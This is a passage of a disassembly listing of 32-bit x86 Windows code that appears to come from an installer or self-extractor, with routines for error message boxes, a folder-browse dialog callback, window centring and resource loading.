  4040cf:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  4040d5:	68 00 02 00 00       	push   $0x200
  4040da:	50                   	push   %eax
  4040db:	57                   	push   %edi
  4040dc:	ff 15 6c a0 40 00    	call   *0x40a06c
  4040e2:	50                   	push   %eax
  4040e3:	57                   	push   %edi
  4040e4:	68 00 10 00 00       	push   $0x1000
  4040e9:	ff 15 38 a1 40 00    	call   *0x40a138
  4040ef:	57                   	push   %edi
  4040f0:	6a 10                	push   $0x10
  4040f2:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  4040f8:	ba c4 04 00 00       	mov    $0x4c4,%edx
  4040fd:	50                   	push   %eax
  4040fe:	53                   	push   %ebx
  4040ff:	33 c9                	xor    %ecx,%ecx
  404101:	e8 b3 03 00 00       	call   0x4044b9
  404106:	8b f7                	mov    %edi,%esi
  404108:	8b c6                	mov    %esi,%eax
  40410a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40410d:	5f                   	pop    %edi
  40410e:	5e                   	pop    %esi
  40410f:	33 cd                	xor    %ebp,%ecx
  404111:	5b                   	pop    %ebx
  404112:	e8 c9 2b 00 00       	call   0x406ce0
  404117:	8b e5                	mov    %ebp,%esp
  404119:	5d                   	pop    %ebp
  40411a:	c3                   	ret
  40411b:	f7 05 34 9a 40 00 00 	testl  $0x800,0x409a34
  404122:	08 00 00 
  404125:	53                   	push   %ebx
  404126:	8b d9                	mov    %ecx,%ebx
  404128:	74 08                	je     0x404132
  40412a:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  404130:	5b                   	pop    %ebx
  404131:	c3                   	ret
  404132:	e8 70 dd ff ff       	call   0x401ea7
  404137:	83 f8 02             	cmp    $0x2,%eax
  40413a:	74 21                	je     0x40415d
  40413c:	8b c3                	mov    %ebx,%eax
  40413e:	25 00 00 00 ff       	and    $0xff000000,%eax
  404143:	3d 00 00 00 aa       	cmp    $0xaa000000,%eax
  404148:	75 05                	jne    0x40414f
  40414a:	f6 c3 01             	test   $0x1,%bl
  40414d:	75 0e                	jne    0x40415d
  40414f:	f7 05 34 9a 40 00 00 	testl  $0x200,0x409a34
  404156:	02 00 00 
  404159:	74 0c                	je     0x404167
  40415b:	eb cd                	jmp    0x40412a
  40415d:	c7 05 24 91 40 00 c2 	movl   $0xbc2,0x409124
  404164:	0b 00 00 
  404167:	5b                   	pop    %ebx
  404168:	c3                   	ret
  404169:	8b ff                	mov    %edi,%edi
  40416b:	53                   	push   %ebx
  40416c:	56                   	push   %esi
  40416d:	57                   	push   %edi
  40416e:	33 db                	xor    %ebx,%ebx
  404170:	33 d2                	xor    %edx,%edx
  404172:	53                   	push   %ebx
  404173:	b9 08 13 40 00       	mov    $0x401308,%ecx
  404178:	e8 12 05 00 00       	call   0x40468f
  40417d:	8b f8                	mov    %eax,%edi
  40417f:	8d 0c bd 04 00 00 00 	lea    0x4(,%edi,4),%ecx
  404186:	51                   	push   %ecx
  404187:	6a 40                	push   $0x40
  404189:	ff 15 50 a1 40 00    	call   *0x40a150
  40418f:	8b f0                	mov    %eax,%esi
  404191:	85 f6                	test   %esi,%esi
  404193:	75 13                	jne    0x4041a8
  404195:	53                   	push   %ebx
  404196:	6a 10                	push   $0x10
  404198:	53                   	push   %ebx
  404199:	53                   	push   %ebx
  40419a:	ba b5 04 00 00       	mov    $0x4b5,%edx
  40419f:	33 c9                	xor    %ecx,%ecx
  4041a1:	e8 13 03 00 00       	call   0x4044b9
  4041a6:	eb 45                	jmp    0x4041ed
  4041a8:	57                   	push   %edi
  4041a9:	8b d6                	mov    %esi,%edx
  4041ab:	b9 08 13 40 00       	mov    $0x401308,%ecx
  4041b0:	e8 da 04 00 00       	call   0x40468f
  4041b5:	85 c0                	test   %eax,%eax
  4041b7:	75 0c                	jne    0x4041c5
  4041b9:	53                   	push   %ebx
  4041ba:	6a 10                	push   $0x10
  4041bc:	53                   	push   %ebx
  4041bd:	53                   	push   %ebx
  4041be:	ba b1 04 00 00       	mov    $0x4b1,%edx
  4041c3:	eb 1a                	jmp    0x4041df
  4041c5:	68 c0 12 40 00       	push   $0x4012c0
  4041ca:	56                   	push   %esi
  4041cb:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  4041d1:	85 c0                	test   %eax,%eax
  4041d3:	74 11                	je     0x4041e6
  4041d5:	53                   	push   %ebx
  4041d6:	6a 40                	push   $0x40
  4041d8:	53                   	push   %ebx
  4041d9:	56                   	push   %esi
  4041da:	ba e9 03 00 00       	mov    $0x3e9,%edx
  4041df:	33 c9                	xor    %ecx,%ecx
  4041e1:	e8 d3 02 00 00       	call   0x4044b9
  4041e6:	56                   	push   %esi
  4041e7:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  4041ed:	5f                   	pop    %edi
  4041ee:	5e                   	pop    %esi
  4041ef:	5b                   	pop    %ebx
  4041f0:	c3                   	ret
  4041f1:	cc                   	int3
  4041f2:	cc                   	int3
  4041f3:	cc                   	int3
  4041f4:	cc                   	int3
  4041f5:	cc                   	int3
  4041f6:	cc                   	int3
  4041f7:	cc                   	int3
  4041f8:	cc                   	int3
  4041f9:	cc                   	int3
  4041fa:	cc                   	int3
  4041fb:	cc                   	int3
  4041fc:	cc                   	int3
  4041fd:	cc                   	int3
  4041fe:	cc                   	int3
  4041ff:	cc                   	int3
  404200:	8b ff                	mov    %edi,%edi
  404202:	55                   	push   %ebp
  404203:	8b ec                	mov    %esp,%ebp
  404205:	83 6d 0c 01          	subl   $0x1,0xc(%ebp)
  404209:	75 13                	jne    0x40421e
  40420b:	ff 75 14             	push   0x14(%ebp)
  40420e:	6a 01                	push   $0x1
  404210:	68 66 04 00 00       	push   $0x466
  404215:	ff 75 08             	push   0x8(%ebp)
  404218:	ff 15 04 a2 40 00    	call   *0x40a204
  40421e:	33 c0                	xor    %eax,%eax
  404220:	5d                   	pop    %ebp
  404221:	c2 10 00             	ret    $0x10
  404224:	8b ff                	mov    %edi,%edi
  404226:	55                   	push   %ebp
  404227:	8b ec                	mov    %esp,%ebp
  404229:	83 ec 30             	sub    $0x30,%esp
  40422c:	53                   	push   %ebx
  40422d:	56                   	push   %esi
  40422e:	57                   	push   %edi
  40422f:	68 88 81 40 00       	push   $0x408188
  404234:	8b f1                	mov    %ecx,%esi
  404236:	ff 15 78 a0 40 00    	call   *0x40a078
  40423c:	8b f8                	mov    %eax,%edi
  40423e:	85 ff                	test   %edi,%edi
  404240:	0f 84 6c 01 00 00    	je     0x4043b2
  404246:	68 a4 81 40 00       	push   $0x4081a4
  40424b:	57                   	push   %edi
  40424c:	ff 15 9c a0 40 00    	call   *0x40a09c
  404252:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404255:	85 c0                	test   %eax,%eax
  404257:	0f 84 47 01 00 00    	je     0x4043a4
  40425d:	68 c3 00 00 00       	push   $0xc3
  404262:	57                   	push   %edi
  404263:	ff 15 9c a0 40 00    	call   *0x40a09c
  404269:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40426c:	85 c0                	test   %eax,%eax
  40426e:	0f 84 30 01 00 00    	je     0x4043a4
  404274:	68 b8 81 40 00       	push   $0x4081b8
  404279:	57                   	push   %edi
  40427a:	ff 15 9c a0 40 00    	call   *0x40a09c
  404280:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404283:	85 c0                	test   %eax,%eax
  404285:	0f 84 19 01 00 00    	je     0x4043a4
  40428b:	33 db                	xor    %ebx,%ebx
  40428d:	38 1d c0 88 40 00    	cmp    %bl,0x4088c0
  404293:	75 51                	jne    0x4042e6
  404295:	68 c0 88 40 00       	push   $0x4088c0
  40429a:	68 04 01 00 00       	push   $0x104
  40429f:	ff 15 00 a1 40 00    	call   *0x40a100
  4042a5:	b9 c0 88 40 00       	mov    $0x4088c0,%ecx
  4042aa:	8d 51 01             	lea    0x1(%ecx),%edx
  4042ad:	8a 01                	mov    (%ecx),%al
  4042af:	41                   	inc    %ecx
  4042b0:	84 c0                	test   %al,%al
  4042b2:	75 f9                	jne    0x4042ad
  4042b4:	2b ca                	sub    %edx,%ecx
  4042b6:	8d 81 c0 88 40 00    	lea    0x4088c0(%ecx),%eax
  4042bc:	50                   	push   %eax
  4042bd:	68 c0 88 40 00       	push   $0x4088c0
  4042c2:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  4042c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042cb:	80 38 5c             	cmpb   $0x5c,(%eax)
  4042ce:	75 16                	jne    0x4042e6
  4042d0:	50                   	push   %eax
  4042d1:	68 c0 88 40 00       	push   $0x4088c0
  4042d6:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  4042dc:	80 38 3a             	cmpb   $0x3a,(%eax)
  4042df:	74 05                	je     0x4042e6
  4042e1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4042e4:	88 18                	mov    %bl,(%eax)
  4042e6:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4042e9:	88 1d a0 87 40 00    	mov    %bl,0x4087a0
  4042ef:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4042f2:	8b f4                	mov    %esp,%esi
  4042f4:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4042f7:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4042fa:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4042fd:	8b cb                	mov    %ebx,%ecx
  4042ff:	50                   	push   %eax
  404300:	c7 45 dc 98 85 40 00 	movl   $0x408598,-0x24(%ebp)
  404307:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40430e:	c7 45 e4 00 42 40 00 	movl   $0x404200,-0x1c(%ebp)
  404315:	c7 45 e8 c0 88 40 00 	movl   $0x4088c0,-0x18(%ebp)
  40431c:	ff 15 88 a2 40 00    	call   *0x40a288
  404322:	ff d3                	call   *%ebx
  404324:	3b f4                	cmp    %esp,%esi
  404326:	74 07                	je     0x40432f
  404328:	b9 04 00 00 00       	mov    $0x4,%ecx
  40432d:	cd 29                	int    $0x29
  40432f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404332:	85 c0                	test   %eax,%eax
  404334:	74 5a                	je     0x404390
  404336:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  404339:	8b f4                	mov    %esp,%esi
  40433b:	68 c0 88 40 00       	push   $0x4088c0
  404340:	50                   	push   %eax
  404341:	8b cb                	mov    %ebx,%ecx
  404343:	ff 15 88 a2 40 00    	call   *0x40a288
  404349:	ff d3                	call   *%ebx
  40434b:	3b f4                	cmp    %esp,%esi
  40434d:	74 07                	je     0x404356
  40434f:	b9 04 00 00 00       	mov    $0x4,%ecx
  404354:	cd 29                	int    $0x29
  404356:	80 3d c0 88 40 00 00 	cmpb   $0x0,0x4088c0
  40435d:	74 14                	je     0x404373
  40435f:	68 c0 88 40 00       	push   $0x4088c0
  404364:	ba 04 01 00 00       	mov    $0x104,%edx
  404369:	b9 a0 87 40 00       	mov    $0x4087a0,%ecx
  40436e:	e8 0d d3 ff ff       	call   0x401680
  404373:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  404376:	8b f4                	mov    %esp,%esi
  404378:	ff 75 f8             	push   -0x8(%ebp)
  40437b:	8b cb                	mov    %ebx,%ecx
  40437d:	ff 15 88 a2 40 00    	call   *0x40a288
  404383:	ff d3                	call   *%ebx
  404385:	3b f4                	cmp    %esp,%esi
  404387:	74 07                	je     0x404390
  404389:	b9 04 00 00 00       	mov    $0x4,%ecx
  40438e:	cd 29                	int    $0x29
  404390:	57                   	push   %edi
  404391:	ff 15 ac a0 40 00    	call   *0x40a0ac
  404397:	33 c0                	xor    %eax,%eax
  404399:	38 05 a0 87 40 00    	cmp    %al,0x4087a0
  40439f:	0f 95 c0             	setne  %al
  4043a2:	eb 23                	jmp    0x4043c7
  4043a4:	57                   	push   %edi
  4043a5:	ff 15 ac a0 40 00    	call   *0x40a0ac
  4043ab:	ba c1 04 00 00       	mov    $0x4c1,%edx
  4043b0:	eb 05                	jmp    0x4043b7
  4043b2:	ba c2 04 00 00       	mov    $0x4c2,%edx
  4043b7:	33 db                	xor    %ebx,%ebx
  4043b9:	8b ce                	mov    %esi,%ecx
  4043bb:	53                   	push   %ebx
  4043bc:	6a 10                	push   $0x10
  4043be:	53                   	push   %ebx
  4043bf:	53                   	push   %ebx
  4043c0:	e8 f4 00 00 00       	call   0x4044b9
  4043c5:	33 c0                	xor    %eax,%eax
  4043c7:	5f                   	pop    %edi
  4043c8:	5e                   	pop    %esi
  4043c9:	5b                   	pop    %ebx
  4043ca:	8b e5                	mov    %ebp,%esp
  4043cc:	5d                   	pop    %ebp
  4043cd:	c2 08 00             	ret    $0x8
  4043d0:	8b ff                	mov    %edi,%edi
  4043d2:	55                   	push   %ebp
  4043d3:	8b ec                	mov    %esp,%ebp
  4043d5:	83 ec 38             	sub    $0x38,%esp
  4043d8:	a1 04 80 40 00       	mov    0x408004,%eax
  4043dd:	33 c5                	xor    %ebp,%eax
  4043df:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4043e2:	53                   	push   %ebx
  4043e3:	56                   	push   %esi
  4043e4:	8b c1                	mov    %ecx,%eax
  4043e6:	8b f2                	mov    %edx,%esi
  4043e8:	57                   	push   %edi
  4043e9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4043ec:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4043ef:	51                   	push   %ecx
  4043f0:	50                   	push   %eax
  4043f1:	ff 15 c4 a1 40 00    	call   *0x40a1c4
  4043f7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4043fa:	2b 45 dc             	sub    -0x24(%ebp),%eax
  4043fd:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  404400:	2b 5d e0             	sub    -0x20(%ebp),%ebx
  404403:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404406:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404409:	50                   	push   %eax
  40440a:	56                   	push   %esi
  40440b:	ff 15 c4 a1 40 00    	call   *0x40a1c4
  404411:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404414:	8b 7d f4             	mov    -0xc(%ebp),%edi
  404417:	2b 45 f0             	sub    -0x10(%ebp),%eax
  40441a:	ff 75 d8             	push   -0x28(%ebp)
  40441d:	2b 7d ec             	sub    -0x14(%ebp),%edi
  404420:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404423:	ff 15 c0 a1 40 00    	call   *0x40a1c0
  404429:	8b f0                	mov    %eax,%esi
  40442b:	6a 08                	push   $0x8
  40442d:	56                   	push   %esi
  40442e:	ff 15 58 a0 40 00    	call   *0x40a058
  404434:	6a 0a                	push   $0xa
  404436:	56                   	push   %esi
  404437:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40443a:	ff 15 58 a0 40 00    	call   *0x40a058
  404440:	56                   	push   %esi
  404441:	ff 75 d8             	push   -0x28(%ebp)
  404444:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404447:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  40444d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404450:	2b f9                	sub    %ecx,%edi
  404452:	8b c7                	mov    %edi,%eax
  404454:	99                   	cltd
  404455:	2b c2                	sub    %edx,%eax
  404457:	8b f0                	mov    %eax,%esi
  404459:	d1 fe                	sar    $1,%esi
  40445b:	03 75 ec             	add    -0x14(%ebp),%esi
  40445e:	6a 00                	push   $0x0
  404460:	5f                   	pop    %edi
  404461:	79 04                	jns    0x404467
  404463:	8b f7                	mov    %edi,%esi
  404465:	eb 0e                	jmp    0x404475
  404467:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40446a:	8d 04 0e             	lea    (%esi,%ecx,1),%eax
  40446d:	3b c2                	cmp    %edx,%eax
  40446f:	7e 04                	jle    0x404475
  404471:	8b f2                	mov    %edx,%esi
  404473:	2b f1                	sub    %ecx,%esi
  404475:	8b 45 cc             	mov    -0x34(%ebp),%eax
  404478:	2b c3                	sub    %ebx,%eax
  40447a:	99                   	cltd
  40447b:	2b c2                	sub    %edx,%eax
  40447d:	8b c8                	mov    %eax,%ecx
  40447f:	d1 f9                	sar    $1,%ecx
  404481:	03 4d f0             	add    -0x10(%ebp),%ecx
  404484:	79 04                	jns    0x40448a
  404486:	8b cf                	mov    %edi,%ecx
  404488:	eb 0e                	jmp    0x404498
  40448a:	8b 55 c8             	mov    -0x38(%ebp),%edx
  40448d:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  404490:	3b c2                	cmp    %edx,%eax
  404492:	7e 04                	jle    0x404498
  404494:	8b ca                	mov    %edx,%ecx
  404496:	2b cb                	sub    %ebx,%ecx
  404498:	6a 05                	push   $0x5
  40449a:	57                   	push   %edi
  40449b:	57                   	push   %edi
  40449c:	51                   	push   %ecx
  40449d:	56                   	push   %esi
  40449e:	57                   	push   %edi
  40449f:	ff 75 d8             	push   -0x28(%ebp)
  4044a2:	ff 15 bc a1 40 00    	call   *0x40a1bc
  4044a8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4044ab:	5f                   	pop    %edi
  4044ac:	5e                   	pop    %esi
  4044ad:	33 cd                	xor    %ebp,%ecx
  4044af:	5b                   	pop    %ebx
  4044b0:	e8 2b 28 00 00       	call   0x406ce0
  4044b5:	8b e5                	mov    %ebp,%esp
  4044b7:	5d                   	pop    %ebp
  4044b8:	c3                   	ret
  4044b9:	8b ff                	mov    %edi,%edi
  4044bb:	55                   	push   %ebp
  4044bc:	8b ec                	mov    %esp,%ebp
  4044be:	81 ec 44 02 00 00    	sub    $0x244,%esp
  4044c4:	a1 04 80 40 00       	mov    0x408004,%eax
  4044c9:	33 c5                	xor    %ebp,%eax
  4044cb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044ce:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  4044d5:	53                   	push   %ebx
  4044d6:	56                   	push   %esi
  4044d7:	57                   	push   %edi
  4044d8:	89 8d bc fd ff ff    	mov    %ecx,-0x244(%ebp)
  4044de:	8d 7d c4             	lea    -0x3c(%ebp),%edi
  4044e1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4044e4:	be 14 13 40 00       	mov    $0x401314,%esi
  4044e9:	6a 0d                	push   $0xd
  4044eb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4044ee:	59                   	pop    %ecx
  4044ef:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4044f1:	89 85 c0 fd ff ff    	mov    %eax,-0x240(%ebp)
  4044f7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4044f8:	0f 85 7b 01 00 00    	jne    0x404679
  4044fe:	68 00 02 00 00       	push   $0x200
  404503:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  404509:	c6 85 c4 fd ff ff 00 	movb   $0x0,-0x23c(%ebp)
  404510:	50                   	push   %eax
  404511:	52                   	push   %edx
  404512:	ff 35 3c 9a 40 00    	push   0x409a3c
  404518:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40451e:	80 bd c4 fd ff ff 00 	cmpb   $0x0,-0x23c(%ebp)
  404525:	75 3b                	jne    0x404562
  404527:	e8 f3 22 00 00       	call   0x40681f
  40452c:	85 c0                	test   %eax,%eax
  40452e:	74 0f                	je     0x40453f
  404530:	51                   	push   %ecx
  404531:	e8 93 22 00 00       	call   0x4067c9
  404536:	85 c0                	test   %eax,%eax
  404538:	b8 10 00 19 00       	mov    $0x190010,%eax
  40453d:	75 05                	jne    0x404544
  40453f:	b8 10 00 01 00       	mov    $0x10010,%eax
  404544:	50                   	push   %eax
  404545:	68 54 91 40 00       	push   $0x409154
  40454a:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40454d:	50                   	push   %eax
  40454e:	ff b5 bc fd ff ff    	push   -0x244(%ebp)
  404554:	ff 15 0c a2 40 00    	call   *0x40a20c
  40455a:	83 c8 ff             	or     $0xffffffff,%eax
  40455d:	e9 1a 01 00 00       	jmp    0x40467c
  404562:	8d 8d c4 fd ff ff    	lea    -0x23c(%ebp),%ecx
  404568:	8d 51 01             	lea    0x1(%ecx),%edx
  40456b:	8a 01                	mov    (%ecx),%al
  40456d:	41                   	inc    %ecx
  40456e:	84 c0                	test   %al,%al
  404570:	75 f9                	jne    0x40456b
  404572:	8b b5 c0 fd ff ff    	mov    -0x240(%ebp),%esi
  404578:	2b ca                	sub    %edx,%ecx
  40457a:	85 f6                	test   %esi,%esi
  40457c:	74 4b                	je     0x4045c9
  40457e:	8b d3                	mov    %ebx,%edx
  404580:	8d 7a 01             	lea    0x1(%edx),%edi
  404583:	8a 02                	mov    (%edx),%al
  404585:	42                   	inc    %edx
  404586:	84 c0                	test   %al,%al
  404588:	75 f9                	jne    0x404583
  40458a:	2b d7                	sub    %edi,%edx
  40458c:	8d 7e 01             	lea    0x1(%esi),%edi
  40458f:	8a 06                	mov    (%esi),%al
  404591:	46                   	inc    %esi
  404592:	84 c0                	test   %al,%al
  404594:	75 f9                	jne    0x40458f
  404596:	2b f7                	sub    %edi,%esi
  404598:	8d 04 16             	lea    (%esi,%edx,1),%eax
  40459b:	8d 71 64             	lea    0x64(%ecx),%esi
  40459e:	03 f0                	add    %eax,%esi
  4045a0:	56                   	push   %esi
  4045a1:	6a 40                	push   $0x40
  4045a3:	ff 15 50 a1 40 00    	call   *0x40a150
  4045a9:	8b f8                	mov    %eax,%edi
  4045ab:	85 ff                	test   %edi,%edi
  4045ad:	74 ab                	je     0x40455a
  4045af:	ff b5 c0 fd ff ff    	push   -0x240(%ebp)
  4045b5:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4045bb:	53                   	push   %ebx
  4045bc:	50                   	push   %eax
  4045bd:	56                   	push   %esi
  4045be:	57                   	push   %edi
  4045bf:	e8 5a d1 ff ff       	call   0x40171e
  4045c4:	83 c4 14             	add    $0x14,%esp
  4045c7:	eb 64                	jmp    0x40462d
  4045c9:	85 db                	test   %ebx,%ebx
  4045cb:	74 3a                	je     0x404607
  4045cd:	8b d3                	mov    %ebx,%edx
  4045cf:	8d 72 01             	lea    0x1(%edx),%esi
  4045d2:	8a 02                	mov    (%edx),%al
  4045d4:	42                   	inc    %edx
  4045d5:	84 c0                	test   %al,%al
  4045d7:	75 f9                	jne    0x4045d2
  4045d9:	2b d6                	sub    %esi,%edx
  4045db:	8d 72 64             	lea    0x64(%edx),%esi
  4045de:	03 f1                	add    %ecx,%esi
  4045e0:	56                   	push   %esi
  4045e1:	6a 40                	push   $0x40
  4045e3:	ff 15 50 a1 40 00    	call   *0x40a150
  4045e9:	8b f8                	mov    %eax,%edi
  4045eb:	85 ff                	test   %edi,%edi
  4045ed:	0f 84 67 ff ff ff    	je     0x40455a
  4045f3:	53                   	push   %ebx
  4045f4:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4045fa:	50                   	push   %eax
  4045fb:	56                   	push   %esi
  4045fc:	57                   	push   %edi
  4045fd:	e8 1c d1 ff ff       	call   0x40171e
  404602:	83 c4 10             	add    $0x10,%esp
  404605:	eb 26                	jmp    0x40462d
  404607:	8d 71 01             	lea    0x1(%ecx),%esi
  40460a:	56                   	push   %esi
  40460b:	6a 40                	push   $0x40
  40460d:	ff 15 50 a1 40 00    	call   *0x40a150
  404613:	8b f8                	mov    %eax,%edi
  404615:	85 ff                	test   %edi,%edi
  404617:	0f 84 3d ff ff ff    	je     0x40455a
  40461d:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  404623:	8b d6                	mov    %esi,%edx
  404625:	50                   	push   %eax
  404626:	8b cf                	mov    %edi,%ecx
  404628:	e8 53 d0 ff ff       	call   0x401680
  40462d:	ff 75 10             	push   0x10(%ebp)
  404630:	ff 15 dc a1 40 00    	call   *0x40a1dc
  404636:	e8 e4 21 00 00       	call   0x40681f
  40463b:	85 c0                	test   %eax,%eax
  40463d:	74 0f                	je     0x40464e
  40463f:	51                   	push   %ecx
  404640:	e8 84 21 00 00       	call   0x4067c9
  404645:	85 c0                	test   %eax,%eax
  404647:	b8 00 00 19 00       	mov    $0x190000,%eax
  40464c:	75 05                	jne    0x404653
  40464e:	b8 00 00 01 00       	mov    $0x10000,%eax
  404653:	0b 45 10             	or     0x10(%ebp),%eax
  404656:	0b 45 14             	or     0x14(%ebp),%eax
  404659:	50                   	push   %eax
  40465a:	68 54 91 40 00       	push   $0x409154
  40465f:	57                   	push   %edi
  404660:	ff b5 bc fd ff ff    	push   -0x244(%ebp)
  404666:	ff 15 0c a2 40 00    	call   *0x40a20c
  40466c:	57                   	push   %edi
  40466d:	8b f0                	mov    %eax,%esi
  40466f:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  404675:	8b c6                	mov    %esi,%eax
  404677:	eb 03                	jmp    0x40467c
  404679:	33 c0                	xor    %eax,%eax
  40467b:	40                   	inc    %eax
  40467c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40467f:	5f                   	pop    %edi
  404680:	5e                   	pop    %esi
  404681:	33 cd                	xor    %ebp,%ecx
  404683:	5b                   	pop    %ebx
  404684:	e8 57 26 00 00       	call   0x406ce0
  404689:	8b e5                	mov    %ebp,%esp
  40468b:	5d                   	pop    %ebp
  40468c:	c2 10 00             	ret    $0x10
  40468f:	8b ff                	mov    %edi,%edi
  404691:	55                   	push   %ebp
  404692:	8b ec                	mov    %esp,%ebp
  404694:	53                   	push   %ebx
  404695:	56                   	push   %esi
  404696:	57                   	push   %edi
  404697:	6a 0a                	push   $0xa
  404699:	8b f9                	mov    %ecx,%edi
  40469b:	8b da                	mov    %edx,%ebx
  40469d:	57                   	push   %edi
  40469e:	6a 00                	push   $0x0
  4046a0:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  4046a6:	50                   	push   %eax
  4046a7:	6a 00                	push   $0x0
  4046a9:	ff 15 c8 a0 40 00    	call   *0x40a0c8
  4046af:	8b f0                	mov    %eax,%esi
  4046b1:	3b 75 08             	cmp    0x8(%ebp),%esi
  4046b4:	77 45                	ja     0x4046fb
  4046b6:	85 db                	test   %ebx,%ebx
  4046b8:	74 41                	je     0x4046fb
  4046ba:	85 f6                	test   %esi,%esi
  4046bc:	74 3b                	je     0x4046f9
  4046be:	6a 0a                	push   $0xa
  4046c0:	57                   	push   %edi
  4046c1:	6a 00                	push   $0x0
  4046c3:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  4046c9:	50                   	push   %eax
  4046ca:	6a 00                	push   $0x0
  4046cc:	ff 15 28 a1 40 00    	call   *0x40a128
  4046d2:	50                   	push   %eax
  4046d3:	ff 15 18 a1 40 00    	call   *0x40a118
  4046d9:	8b f8                	mov    %eax,%edi
  4046db:	85 ff                	test   %edi,%edi
  4046dd:	74 1a                	je     0x4046f9
  4046df:	56                   	push   %esi
  4046e0:	57                   	push   %edi
  4046e1:	ff 75 08             	push   0x8(%ebp)
  4046e4:	53                   	push   %ebx
  4046e5:	ff 15 78 a2 40 00    	call   *0x40a278
  4046eb:	83 c4 10             	add    $0x10,%esp
  4046ee:	57                   	push   %edi
  4046ef:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  4046f5:	8b c6                	mov    %esi,%eax
  4046f7:	eb 02                	jmp    0x4046fb
  4046f9:	33 c0                	xor    %eax,%eax
  4046fb:	5f                   	pop    %edi
  4046fc:	5e                   	pop    %esi
  4046fd:	5b                   	pop    %ebx
  4046fe:	5d                   	pop    %ebp
  4046ff:	c2 04 00             	ret    $0x4
  404702:	8b ff                	mov    %edi,%edi
  404704:	55                   	push   %ebp
  404705:	8b ec                	mov    %esp,%ebp
  404707:	56                   	push   %esi
  404708:	57                   	push   %edi
  404709:	52                   	push   %edx
  40470a:	bf 04 01 00 00       	mov    $0x104,%edi
  40470f:	8b f1                	mov    %ecx,%esi
  404711:	8b d7                	mov    %edi,%edx
  404713:	e8 68 cf ff ff       	call   0x401680
  404718:	8b d6                	mov    %esi,%edx
  40471a:	8d 4a 01             	lea    0x1(%edx),%ecx
  40471d:	8a 02                	mov    (%edx),%al
  40471f:	42                   	inc    %edx
  404720:	84 c0                	test   %al,%al
  404722:	75 f9                	jne    0x40471d
  404724:	2b d1                	sub    %ecx,%edx
  404726:	80 7c 32 ff 5c       	cmpb   $0x5c,-0x1(%edx,%esi,1)
  40472b:	74 2b                	je     0x404758
  40472d:	8b ce                	mov    %esi,%ecx
  40472f:	8d 51 01             	lea    0x1(%ecx),%edx
  404732:	8a 01                	mov    (%ecx),%al
  404734:	41                   	inc    %ecx
  404735:	84 c0                	test   %al,%al
  404737:	75 f9                	jne    0x404732
  404739:	2b ca                	sub    %edx,%ecx
  40473b:	80 7c 31 ff 2f       	cmpb   $0x2f,-0x1(%ecx,%esi,1)
  404740:	74 16                	je     0x404758
  404742:	68 44 12 40 00       	push   $0x401244
  404747:	8b d7                	mov    %edi,%edx
  404749:	8b ce                	mov    %esi,%ecx
  40474b:	e8 63 cf ff ff       	call   0x4016b3
  404750:	85 c0                	test   %eax,%eax
  404752:	79 04                	jns    0x404758
  404754:	33 c0                	xor    %eax,%eax
  404756:	eb 0f                	jmp    0x404767
  404758:	ff 75 08             	push   0x8(%ebp)
  40475b:	8b d7                	mov    %edi,%edx
  40475d:	8b ce                	mov    %esi,%ecx
  40475f:	e8 4f cf ff ff       	call   0x4016b3
  404764:	33 c0                	xor    %eax,%eax
  404766:	40                   	inc    %eax
  404767:	5f                   	pop    %edi
  404768:	5e                   	pop    %esi
  404769:	5d                   	pop    %ebp
  40476a:	c2 04 00             	ret    $0x4
  40476d:	8b ff                	mov    %edi,%edi
  40476f:	56                   	push   %esi
  404770:	8b f1                	mov    %ecx,%esi
  404772:	e8 37 1f 00 00       	call   0x4066ae
  404777:	85 c0                	test   %eax,%eax
